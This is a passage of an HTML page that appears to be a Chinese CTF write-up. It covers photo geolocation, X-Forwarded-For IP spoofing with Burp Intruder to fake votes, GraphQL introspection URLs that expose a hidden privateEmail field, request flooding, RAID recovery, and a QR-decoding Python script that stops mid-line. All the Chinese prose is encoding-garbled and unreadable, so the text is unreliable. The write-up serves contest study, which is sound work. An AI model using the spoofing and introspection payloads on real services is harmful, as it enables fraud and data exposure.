title=\"æ—…è¡Œç…§ç‰‡\"></a>æ—…è¡Œç…§ç‰‡</h2><p><del>ç®€ç®€å•å•å¼€ä¸ªç›’</del><br>æ—…æ¸¸ï¼Œæµ·æ»©ï¼Œæ±‰å­—ï¼Œè¯´æ˜è¿™æ˜¯å›½å†…ä¸€ä¸ªæµ·è¾¹æ—…æ¸¸æ™¯ç‚¹ã€‚<br>è“è‰²KFCï¼Ÿè¿™å¯ä¸å¸¸è§ï¼Œåº”è¯¥æœ‰ä¸å°‘äººæ‰“å¡äº†å§ã€‚<br>ç™¾åº¦æœç´¢<code>è“è‰²KFC</code>ï¼Œç¬¬ä¸€é¡¹å°±æ˜¯æŸçº¢ä¹¦çš„<code>ç§¦çš‡å²›è’‚å‡¡å°¼è“ç§¦çš‡å²›ç½‘çº¢æ‰“å¡|å›½å†…å”¯ä¸€è’‚èŠ™å°¼è“è‰²è‚¯å¾·åŸº</code><br>ç™¾åº¦åœ°å›¾å®šä½å‘ç°è¿™å®¶åº—æ˜¯æŸæµ·åº•ä¸–ç•Œåˆ†åº—ï¼Œç›´æ¥å¾—åˆ°ç”µè¯å·ç ã€‚<br><a href=\"https://www.earthol.org/\">https://www.earthol.org/</a>ä¸Šé€šè¿‡è¡—æ™¯å‘ç°ä¸‰ä¸ªæ±‰å­—â€œæµ·|è±š|é¦†â€<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg\" alt=\"building\" loading=\"lazy\"></p>\n<p>å¯¹ç…§åœ°å›¾ï¼Œè§†çº¿å’Œæµ·å²¸çº¿å¤§çº¦æˆ45Â°ï¼Œæ¨æµ‹åº”å½“åœ¨ä¸œå—æ–¹å‘ã€‚è¿›è€Œå‘ç°å½±å­è¥¿æ–œï¼Œåº”å½“åœ¨ä¸‹åˆ&#x2F;å‚æ™š<br>é€šè¿‡ç»˜åˆ¶å„ä¸ªæ°´å¹³çº¿æ‰¾å‡ºç­ç‚¹å¯ä»¥æ¨æµ‹æ¥¼å±‚ï¼ˆçŸ¥ä¹æœ‰äº›æ–‡ç« æœ‰è¯¦ç»†è¯´æ˜ï¼‰ã€‚æˆ‘çš„æ–¹æ³•æ˜¯æ‰¾åˆ°å¯¹é¢æ¥¼â€œæœ€çŸ©å½¢â€å˜å½¢æœ€å°‘çš„çª—æˆ·åˆ¤æ–­ä¸ºåŒä¸€æ¥¼å±‚ï¼Œç„¶åæ•°ï¼Œå‘ç°æ˜¯13å±‚å·¦å³ï¼ˆç»å°è¯•å‘ç°æ˜¯14å±‚ï¼‰</p>\n<hr>\n<h2 id=\"FLAGåŠ©åŠ›å¤§çº¢åŒ…\"><a href=\"#FLAGåŠ©åŠ›å¤§çº¢åŒ…\" class=\"headerlink\" title=\"FLAGåŠ©åŠ›å¤§çº¢åŒ…\"></a>FLAGåŠ©åŠ›å¤§çº¢åŒ…</h2><p>æ—¢ç„¶æ˜¯å’Œipæœ‰å…³ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å°±æ˜¯<code>X-Forwarded-For</code>ï¼Œæœç„¶æˆåŠŸäº†ã€‚å› ä¸ºæ¯ä¸ª<code>/8</code>ipæ®µï¼ˆä¹Ÿå°±æ˜¯ä¾‹å¦‚255.0.0.0-255.255.255.255ï¼‰éƒ½åªèƒ½ç®—ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä½¿ç”¨BurpSuiteçš„Intruderï¼Œå°†Postæ•°æ®ä¸­çš„ipå’Œ<code>X-Forwarded-For</code>çš„ipé¦–æ®µæ‰“ä¸Šæ ‡è®°ï¼Œé€‰æ‹©<code>Battering Ram</code>æ¨¡å¼ï¼ˆè®©ä¸¤å¤„å‚æ•°ä¸€è‡´ï¼‰ï¼Œæ„é€ 0~255çš„å­—å…¸ï¼Œè‡ªåŠ¨åŒ–è®¿é—®<code>0.114.114.114</code>ã€<code>1.114.114.114</code>ã€<code>2.114.114.114</code>â€¦â€¦<code>255.114.114.114</code>è¾¾æˆåˆšå¥½256ä¸ªåŠ©åŠ›è·å¾—flagã€‚ç”±äºæ¯æ¬¡é—´éš”2sï¼Œ2s*256&#x3D;512sï¼Œå°äºé¢˜ç›®æ—¶é•¿é™åˆ¶10min&#x3D;600sæ‰€ä»¥æ˜¯å¯è¡Œçš„ã€‚</p>\n<hr>\n<h2 id=\"Amnesia-è½»åº¦å¤±å¿†\"><a href=\"#Amnesia-è½»åº¦å¤±å¿†\" class=\"headerlink\" title=\"Amnesia-è½»åº¦å¤±å¿†\"></a>Amnesia-è½»åº¦å¤±å¿†</h2><p>ç›´æ¥<code>putchar()</code>é€ä¸ªæ‰“å°ç»•è¿‡å³å¯ã€‚</p>\n<hr>\n<h2 id=\"å›¾ä¹‹ä¸Šçš„ä¿¡æ¯\"><a href=\"#å›¾ä¹‹ä¸Šçš„ä¿¡æ¯\" class=\"headerlink\" title=\"å›¾ä¹‹ä¸Šçš„ä¿¡æ¯\"></a>å›¾ä¹‹ä¸Šçš„ä¿¡æ¯</h2><p>GraphQLçš„åˆ©ç”¨ã€‚è®¿é—®<code>/graphql?query=&#123;&#125;</code>å‘ç°å­˜åœ¨åˆ©ç”¨å¯èƒ½ã€‚æŸ¥é˜…<a href=\"https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ\">èµ„æ–™</a>åå¾—çŸ¥å¯ä»¥åˆ©ç”¨å†…çœæ³¨å…¥ã€‚æ²¡æœ‰UIç•Œé¢æˆ‘ç›´æ¥åœ°å€æ è¾“å…¥ã€‚æ¢è¡Œæ›¿æ¢ä¸º<code>%0A</code>åï¼Œè®¿é—®<code>/graphql?query=&#123;__schema%0A&#123;types%0A&#123;name&#125;&#125;&#125;</code>å¾—åˆ°ï¼š</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;__schema&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;types&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">[</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Query&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;GNote&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Int&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;String&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;GUser&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Boolean&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Schema&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Type&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__TypeKind&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Field&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__InputValue&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__EnumValue&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__Directive&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__DirectiveLocation&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°æœ‰ä¸ª<code>GUser</code>ç±»å‹ã€‚æ¥ä¸‹æ¥è®¿é—®<code>/graphql?query=&#123;__type(name:&quot;GUser&quot;)&#123;name%0Afields&#123;name%0Atype&#123;name,kind&#125;&#125;&#125;&#125;</code>çˆ†å‡ºå­—æ®µå<code>privateEmail</code>ï¼Œç„¶åç›´æ¥<code>/graphql?query=&#123;user(id:1)&#123;id,privateEmail&#125;&#125;</code>å¾—åˆ°flag.</p>\n<hr>\n<h2 id=\"èµ›åšå¨æˆ¿\"><a href=\"#èµ›åšå¨æˆ¿\" class=\"headerlink\" title=\"èµ›åšå¨æˆ¿\"></a>èµ›åšå¨æˆ¿</h2><ul>\n<li>Level0ï¼šç›´æ¥å†™</li>\n<li>Level1ï¼šå¤åˆ¶ç²˜è´´å‘ç°æœ‰é•¿åº¦é™åˆ¶ gotoä¼˜åŒ–è¡Œæ•°<br> ç„¶åä¸ä¼šäº†ã€‚</li>\n</ul>\n<hr>\n<h2 id=\"é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5\"><a href=\"#é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5\" class=\"headerlink\" title=\"é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5\"></a>é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5</h2><p>ç›´æ¥ä¸¢è¿›RAID Reconstructor 5é‡Œé¢è·‘å¾—åˆ°é•œåƒæ–‡ä»¶ã€‚Windowsä¸Šå¹¶æ²¡æ³•ç›´æ¥è¯»ï¼Œäºæ˜¯ä¸¢è¿›Diskinternals Linux Readeré‡Œè¯»æ–‡ä»¶å¯¼å‡ºã€‚æ‰§è¡Œgetflag.pyå´æç¤º<code>Did you recover my data correctly?</code>ï¼Œç–‘æƒ‘ä¹‹ä¸‹æ¢WSL(Kali Linux)æ‰§è¡Œå°±æˆåŠŸäº†ã€‚<br><del>åæ§½ï¼šRAID0çš„XFSéœ€è¦æ³¨å†Œç æ²¡æ³•æã€‚WSLä¹Ÿmountä¸ä¸Šï¼Œçœ‹æ¥è¿˜æ˜¯è™šæ‹Ÿæœºé è°±ã€‚</del></p>\n<hr>\n<h2 id=\"åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤\"><a href=\"#åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤\" class=\"headerlink\" title=\"åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤\"></a>åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤</h2><p>ä»£ç å®¡è®¡åå‘ç°ç›®çš„æ˜¯å»¶è¿Ÿå°½å¯èƒ½é«˜ã€‚ç”¨BurpSuiteæ”¹åŒ…åœ¨POSTæ•°æ®é‡Œå¤åˆ¶å‡ºæ¥å¾ˆå¤šè¡Œæ³¨è®°è¯æäº¤å°±æœ‰äº†flag1ã€‚å°±åƒè¿™æ ·ï¼š  </p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"string\">&quot;necessary science growth addition&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"string\">&quot;necessary science growth addition&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    ï¼ˆé‡å¤å¥½å¤šå¥½å¤šæ¬¡ï¼‰</span><br><span class=\"line\">    <span class=\"string\">&quot;necessary science growth addition&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">]</span></span><br></pre></td></tr></table></figure>\n\n<p>å¦‚æœä¸è¡ŒCLEARå†è¯•è¯•ã€‚<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg\" alt=\"clear it\" loading=\"lazy\"></p>\n<p>å°å‘ï¼štokenè¦è·Ÿä¸Šæ‰èƒ½æ‹¿åˆ°flagï¼Œä¸è¿‡æœ‰æ—¶è‡ªåŠ¨è·å–çš„tokenæ— æ•ˆï¼Œä½¿å¾—flagåªæ˜¾ç¤ºä¸ºtrueï¼Œå› ä¸ºåŠ å·æ²¡æœ‰URLEncodeè½¬ä¹‰ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯bug.  </p>\n<hr>\n<h2 id=\"é©¬èµ›å…‹\"><a href=\"#é©¬èµ›å…‹\" class=\"headerlink\" title=\"é©¬èµ›å…‹\"></a>é©¬èµ›å…‹</h2><p>æ¨¡æ‹Ÿé¢˜ã€‚å¤§æ¦‚æ€è·¯æ˜¯å…ˆæ‰«ä¸€éï¼ŒæŠŠèƒ½ç¡®å®šçš„å…ˆç¡®å®šä¸‹æ¥ã€‚ä¹‹åå†dfså‰©ä¸‹çš„å—ï¼ˆä¸éœ€è¦å…¨éƒ¨æ±‚å‡ºï¼Œæ¯•ç«Ÿè¿™é¢˜çš„äºŒç»´ç çº é”™æ‹‰æ»¡äº†ï¼‰ã€‚<br>ä»£ç å¾ˆä¸‘å¯¹å§QAQï¼ˆå½“æ—¶ä¸ç†Ÿæ‚‰ndarrayæ“ä½œï¼Œå…¨éƒ¨å½“åšliståšä¸€éï¼‰  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"comment\"># import scipy</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\">SIZE = <span class=\"number\">627</span></span><br><span class=\"line\">MSBLOCK = <span class=\"number\">23</span></span><br><span class=\"line\">QRBLOCK = <span class=\"number\">11</span></span><br><span class=\"line\">X, Y = <span class=\"number\">103</span>, <span class=\"number\">137</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ImageToMatrix</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">    <span class=\"comment\"># è¯»å–å›¾ç‰‡</span></span><br><span class=\"line\">    im = Image.<span class=\"built_in\">open</span>(filename)</span><br><span class=\"line\">    <span class=\"comment\"># æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class=\"line\"><span class=\"comment\">#     im.show()  </span></span><br><span class=\"line\">    width,height = im.size</span><br><span class=\"line\">    im = im.convert(<span class=\"string\">&quot;L&quot;</span>) </span><br><span class=\"line\">    data = im.getdata()</span><br><span class=\"line\">    data = np.matrix(data,dtype=<span class=\"string\">&#x27;float&#x27;</span>)/<span class=\"number\">255.0</span></span><br><span class=\"line\">    new_data = np.reshape(data,(width,height))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_data</span><br><span class=\"line\"><span class=\"comment\">#     new_im = Image.fromarray(new_data)</span></span><br><span class=\"line\"><span class=\"comment\">#     # æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class=\"line\"><span class=\"comment\">#     new_im.show()</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">MatrixToImage</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    data = data*<span class=\"number\">255</span></span><br><span class=\"line\">    new_im = Image.fromarray(data.astype(np.uint8))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_im</span><br><span class=\"line\">    </span><br><span class=\"line\">pre_arr =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)]</span><br><span class=\"line\">res_arr =  [[<span class=\"number\">1</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]</span><br><span class=\"line\">kimeta =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]<span class=\"comment\">#é’¦å®šäº†</span></span><br><span class=\"line\">EACH = <span class=\"built_in\">int</span>(math.ceil(MSBLOCK/QRBLOCK)) <span class=\"comment\">#EACH=3</span></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;pixelated_qrcode.bmp&#x27;</span></span><br><span class=\"line\">data = ImageToMatrix(filename)</span><br><span class=\"line\">np.set_printoptions(threshold=<span class=\"number\">1145141919810</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">            pre_arr[i][j]=data[i].tolist()[<span class=\"number\">0</span>][j]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i%QRBLOCK==<span class=\"number\">0</span> <span class=\"keyword\">and</span> j%QRBLOCK==<span class=\"number\">0</span>:</span><br><span class=\"line\">                res_arr[i//QRBLOCK][j//QRBLOCK]=<span class=\"built_in\">int</span>(data.tolist()[i][j])</span><br><span class=\"line\"><span class=\"comment\"># print(pre_arr)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span>  <span class=\"title function_\">check</span>(<span class=\"params\">i,j,now</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&lt;=<span class=\"number\">9</span> <span class=\"keyword\">or</span> i&gt;=<span class=\"number\">51</span> <span class=\"keyword\">or</span> j&lt;=<span class=\"number\">12</span> <span class=\"keyword\">or</span> j&gt;=<span class=\"number\">54</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (pre_arr[i*QRBLOCK+<span class=\"number\">3</span>][j*QRBLOCK+<span class=\"number\">3</span>] == now):<span class=\"comment\">#éšä¾¿å†™çš„offset</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (kimeta[i][j] <span class=\"keyword\">or</span> vis[i][j]) <span class=\"keyword\">and</span> res_arr[i][j]!=now:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getRange</span>(<span class=\"params\">i,j</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i*QRBLOCK,j*QRBLOCK,(i+<span class=\"number\">1</span>)*QRBLOCK-<span class=\"number\">1</span>,(j+<span class=\"number\">1</span>)*QRBLOCK-<span class=\"number\">1</span> <span class=\"comment\">#x1,y1,x2,y2</span></span><br><span class=\"line\"></span><br><span class=\"line\">vis =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcDelta</span>(<span class=\"params\">Mi,Mj,fillN,comp,LUR,LUC</span>):</span><br><span class=\"line\">    fn = fillN</span><br><span class=\"line\">    <span class=\"keyword\">for</span> xx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> yy <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> check(xx,yy,fn&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">114514</span></span><br><span class=\"line\">            fn = fn&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">    avr = <span class=\"number\">0</span></span><br><span class=\"line\">    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+<span class=\"number\">1</span>)*MSBLOCK-<span class=\"number\">1</span>,Y+(Mj+<span class=\"number\">1</span>)*MSBLOCK-<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fillN&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                x1,y1,x2,y2 = getRange(x,y)</span><br><span class=\"line\">                inx1,iny1,inx2,iny2 = <span class=\"built_in\">max</span>(x1,qx1),<span class=\"built_in\">max</span>(y1,qy1),<span class=\"built_in\">min</span>(x2,qx2),<span class=\"built_in\">min</span>(y2,qy2)</span><br><span class=\"line\">                avr = avr + (iny2-iny1+<span class=\"number\">1</span>)*(inx2-inx1+<span class=\"number\">1</span>)</span><br><span class=\"line\">            fillN = fillN &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    newres = avr/(MSBLOCK*MSBLOCK)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (newres &lt; comp-<span class=\"number\">0.1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1919810</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">abs</span>(math.floor((avr/(MSBLOCK*MSBLOCK))*<span class=\"number\">255</span>)/<span class=\"number\">255</span>-comp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">putRec</span>(<span class=\"params\">i,j</span>):<span class=\"comment\">#æ”¾ç½®è¯†åˆ«ç å—</span></span><br><span class=\"line\">    kimeta[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    kimeta[i][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span 